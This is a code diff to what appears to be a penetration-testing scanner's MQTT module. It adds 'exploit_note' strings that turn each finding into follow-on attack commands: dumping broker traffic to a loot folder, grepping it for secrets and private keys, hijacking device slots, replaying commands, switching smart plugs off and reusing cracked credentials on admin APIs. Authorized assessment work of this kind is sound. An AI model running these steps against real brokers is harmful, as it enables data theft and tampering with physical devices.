@@ -692,10 +692,12 @@ def mqtt_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "mosquitto_sub", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 _REASON_TXT = {
@@ -737,7 +739,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "access (mosquitto: 'allow_anonymous false'; EMQX: "
                     "'listeners.tcp.default.enable_authn = true'). Bind to a "
                     "private interface.",
-                    ["CWE-306", "CWE-284"], kind="mqtt_anonymous_connect"))
+                    ["CWE-306", "CWE-284"], kind="mqtt_anonymous_connect",
+                    exploit_note=(
+                        f"mosquitto_sub -h {h.ip} -p {p.portid} -t '#' -v -W 10; "
+                        f"then mosquitto_sub -h {h.ip} -p {p.portid} -t '$SYS/#' -v -W 3; "
+                        f"then mosquitto_pub -h {h.ip} -p {p.portid} -t recce/test -m x -q 1 "
+                        "to confirm write."),
+                    depth_tier="t1"))
 
             # 2. Empty ClientID accepted (§3.1.3.1 says allowed only when
             # CleanSession=1; many brokers accept it unconditionally, and
@@ -754,7 +762,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"mosquitto_sub -h {h.ip} -p {p.portid} -i '' -t '#' -v -W 2",
                     "Configure the broker to require a non-empty ClientID "
                     "(mosquitto: 'per_listener_settings true' + reject empty).",
-                    ["CWE-287", "CWE-778"], kind="mqtt_empty_clientid"))
+                    ["CWE-287", "CWE-778"], kind="mqtt_empty_clientid",
+                    exploit_note=(
+                        "Open two mosquitto_sub sessions with -i '' -t '#' -v; the "
+                        "second CONNECT should knock the first off. Then run "
+                        f"mosquitto_pub -h {h.ip} -i '' -t 'legit/device/id' -m 'takeover' -r "
+                        "to hijack a device's retained slot."),
+                    depth_tier="t1"))
 
             # 3. Wildcard '#' subscribe: retained (critical) or live (high).
             retained = pr.get("retained") or []
@@ -776,7 +790,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "cannot subscribe to '#'; publish secrets on their own topic "
                     "with a per-topic ACL; never store secrets as retained "
                     "messages.",
-                    ["CWE-200", "CWE-522", "CWE-284"], kind="mqtt_retained_messages"))
+                    ["CWE-200", "CWE-522", "CWE-284"], kind="mqtt_retained_messages",
+                    exploit_note=(
+                        f"mosquitto_sub -h {h.ip} -p {p.portid} -t '#' -v -W 30 | "
+                        "tee loot/mqtt_retained.txt; grep -iE "
+                        "'token|pass|secret|api[_-]?key|jwt|bearer|BEGIN [A-Z]+ PRIVATE KEY' "
+                        "loot/mqtt_retained.txt."),
+                    depth_tier="t2"))
 
             live = pr.get("live") or []
             # Live '#' traffic minus $SYS is separately valuable (LWTs land here).
@@ -793,7 +813,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"mosquitto_sub -h {h.ip} -p {p.portid} -t '#' -v",
                     "Enforce topic ACLs on the '#' wildcard; segregate device "
                     "telemetry from operator commands with per-topic auth.",
-                    ["CWE-200", "CWE-284"], kind="mqtt_live_topics"))
+                    ["CWE-200", "CWE-284"], kind="mqtt_live_topics",
+                    exploit_note=(
+                        f"mosquitto_sub -h {h.ip} -p {p.portid} -t '#' -v -W 120 | "
+                        "tee loot/mqtt_live.txt; then for interesting topic run "
+                        f"mosquitto_pub -h {h.ip} -t '<topic>' -m '<observed-command>' "
+                        "to test replay/injection."),
+                    depth_tier="t2"))
 
             # 3b. Will messages captured in the live stream. These are worth
             # calling out even when the wildcard finding fired because they
@@ -835,7 +861,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"mosquitto_sub -h {h.ip} -p {p.portid} -t '\\$SYS/#' -v -W 3",
                     "Restrict $SYS to a dedicated admin principal; deny "
                     "anonymous subscribe on $SYS.",
-                    ["CWE-200"], kind="mqtt_sys_topics"))
+                    ["CWE-200"], kind="mqtt_sys_topics",
+                    exploit_note=(
+                        f"mosquitto_sub -h {h.ip} -p {p.portid} -t '$SYS/#' -v -W 10; "
+                        "note $SYS/broker/version; searchsploit mosquitto <version> "
+                        "for known CVEs."),
+                    depth_tier="t2"))
 
             # 5. Anonymous PUBLISH accepted (critical — attacker can inject
             # commands to subscribing devices).
@@ -852,7 +883,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"mosquitto_pub -h {h.ip} -p {p.portid} -t 'test/rw' -m x",
                     "Set write ACLs on every topic; disable anonymous publish; "
                     "prefer per-device credentials.",
-                    ["CWE-306", "CWE-284", "CWE-77"], kind="mqtt_anonymous_publish"))
+                    ["CWE-306", "CWE-284", "CWE-77"], kind="mqtt_anonymous_publish",
+                    exploit_note=(
+                        "Confirmed writable: "
+                        f"mosquitto_pub -h {h.ip} -p {p.portid} -t 'shellies/<id>/command' -m 'off' "
+                        "(Shelly) or -t 'tasmota/cmnd/<dev>/POWER' -m 'OFF' — DO NOT run "
+                        "without written authorization; recce probe already proved primitive."),
+                    depth_tier="t2"))
 
             # 6. Credential spray hit.
             cred = pr.get("cred")
@@ -870,7 +907,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"-P '{pw_repr}' -t '#' -v -W 3",
                     "Rotate the credential; enforce a password policy (min length "
                     "+ complexity); disable default vendor accounts.",
-                    ["CWE-521", "CWE-798"], kind="mqtt_weak_credential"))
+                    ["CWE-521", "CWE-798"], kind="mqtt_weak_credential",
+                    exploit_note=(
+                        f"mosquitto_sub -h {h.ip} -p {p.portid} -u {cred['user']} "
+                        f"-P '{pw_repr}' -t '#' -v -W 30; then "
+                        f"curl -u {cred['user']}:{pw_repr} http://{h.ip}:18083/api/v5/nodes "
+                        f"(EMQX) or http://{h.ip}:8080 (HiveMQ) to test admin UI reuse."),
+                    depth_tier="t3"))
 
             # 7. Plaintext (1883 without TLS).
             if p.portid == 1883:
